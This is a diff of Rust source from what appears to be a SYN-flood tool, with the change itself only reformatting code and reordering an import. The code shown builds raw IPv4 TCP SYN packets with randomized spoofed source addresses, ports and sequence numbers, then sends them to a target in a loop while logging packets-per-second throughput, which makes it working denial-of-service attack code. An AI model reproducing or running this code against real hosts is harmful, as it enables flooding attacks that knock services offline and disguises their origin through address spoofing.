@@ -1,7 +1,7 @@
 use crate::error::SynFloodingError;
 use crate::option::Opt;
-use crate::runner::run;
 use crate::random::{random_global_ipv4_addr, random_source_port};
+use crate::runner::run;
 use log::debug;
 use log::info;
 use pnet::packet::ip::IpNextHeaderProtocols;
@@ -110,49 +110,64 @@ pub fn flood_v4(opt: &Opt, socket_addr: &SocketAddrV4) -> Result<(), SynFlooding
         tcp_packet.set_window(opt.window_size);
         // leave checksum all zero
         tcp_packet.set_urgent_ptr(0);
-        debug!("basic TCP payload of IPv4 packet constructed: {:?}", tcp_packet);
+        debug!(
+            "basic TCP payload of IPv4 packet constructed: {:?}",
+            tcp_packet
+        );
     }
     let mut rng = rand::thread_rng();
-    let statistics = run(&opt, || {
-        ipv4_packet.set_identification(rng.gen()); // random identification
-        let source_addr = opt.source_address.map(|source| match source {
-            IpAddr::V4(source) => Ok(source),
-            IpAddr::V6(source) => Err(SynFloodingError::Ipv4DestinationWithIpv6Source(*addr, source)),
-        }).transpose()?.unwrap_or_else(|| random_global_ipv4_addr(&opt, &mut rng));
-        ipv4_packet.set_source(source_addr);
-        ipv4_packet.set_checksum(ipv4::checksum(&ipv4_packet.to_immutable()));
-        {
-            let mut tcp_packet = MutableTcpPacket::new(ipv4_packet.payload_mut())
-                .ok_or(SynFloodingError::NewTcpPacket)?;
-            let source_port = opt.source_port.unwrap_or_else(|| random_source_port(&opt, &mut rng));
-            tcp_packet.set_source(source_port);
-            tcp_packet.set_sequence(rng.gen()); // random sequence number
-            tcp_packet.set_checksum(tcp::ipv4_checksum(
-                &tcp_packet.to_immutable(),
-                &source_addr,
-                &addr,
-            ));
-        }
-        let packet = ipv4_packet.to_immutable();
-        debug!(
-            "about to packet {:?} with payload {:?}",
-            packet,
-            TcpPacket::new(packet.payload()).unwrap()
-        );
-        sender
-            .send_to(packet, IpAddr::V4(*addr))
-            .map_err(SynFloodingError::SendPacket)?; // ignore Ok result
-        Ok(())
-    }, |statistics| {
-        info!("summary: duration = {:?}, packet sent = {}, success = {}, failed = {}, package per second = {}",
+    let statistics = run(
+        &opt,
+        || {
+            ipv4_packet.set_identification(rng.gen()); // random identification
+            let source_addr = opt
+                .source_address
+                .map(|source| match source {
+                    IpAddr::V4(source) => Ok(source),
+                    IpAddr::V6(source) => Err(SynFloodingError::Ipv4DestinationWithIpv6Source(
+                        *addr, source,
+                    )),
+                })
+                .transpose()?
+                .unwrap_or_else(|| random_global_ipv4_addr(&opt, &mut rng));
+            ipv4_packet.set_source(source_addr);
+            ipv4_packet.set_checksum(ipv4::checksum(&ipv4_packet.to_immutable()));
+            {
+                let mut tcp_packet = MutableTcpPacket::new(ipv4_packet.payload_mut())
+                    .ok_or(SynFloodingError::NewTcpPacket)?;
+                let source_port = opt
+                    .source_port
+                    .unwrap_or_else(|| random_source_port(&opt, &mut rng));
+                tcp_packet.set_source(source_port);
+                tcp_packet.set_sequence(rng.gen()); // random sequence number
+                tcp_packet.set_checksum(tcp::ipv4_checksum(
+                    &tcp_packet.to_immutable(),
+                    &source_addr,
+                    &addr,
+                ));
+            }
+            let packet = ipv4_packet.to_immutable();
+            debug!(
+                "about to packet {:?} with payload {:?}",
+                packet,
+                TcpPacket::new(packet.payload()).unwrap()
+            );
+            sender
+                .send_to(packet, IpAddr::V4(*addr))
+                .map_err(SynFloodingError::SendPacket)?; // ignore Ok result
+            Ok(())
+        },
+        |statistics| {
+            info!("summary: duration = {:?}, packet sent = {}, success = {}, failed = {}, package per second = {}",
             statistics.duration()?,
             statistics.total(),
             statistics.success,
             statistics.failed,
             statistics.packet_per_second()?,
         );
-        Ok(())
-    })?;
+            Ok(())
+        },
+    )?;
     info!("finished: duration = {:?}, packet sent = {}, success = {}, failed = {}, package per second = {}",
           statistics.duration()?,
           statistics.total(),
